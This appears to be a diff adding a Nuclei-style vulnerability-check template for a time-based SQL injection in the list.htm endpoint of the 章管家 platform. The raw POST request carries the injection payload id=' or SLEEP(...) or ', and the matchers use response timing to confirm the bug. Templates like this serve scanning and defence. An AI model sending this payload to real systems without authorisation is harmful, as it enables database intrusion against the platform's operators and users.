@@ -1,0 +1,31 @@
+id: poc-yaml-zhangin-list-htm-sqli
+info:
+  name: 章管家 list.htm SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    SQL注入漏洞存在于章管家平台的 list.htm 页面。
+    通过精确的时间延迟检测，验证漏洞的存在。
+
+variables:
+  t1: '{{rand_int(5,10)}}'
+  t2: '{{to_number(t1) + 2}}'
+
+http:
+  - raw:
+      - |
+        POST /app/department/list.htm HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        token=dingtalk_token&person_id=1&unit_id=1&id=' or SLEEP({{t1}}) or '
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body, '"status":"1"')
+          - contains(body, '未查询到相关数据')
+          - duration > {{t1}}
+          - duration < {{t2}}
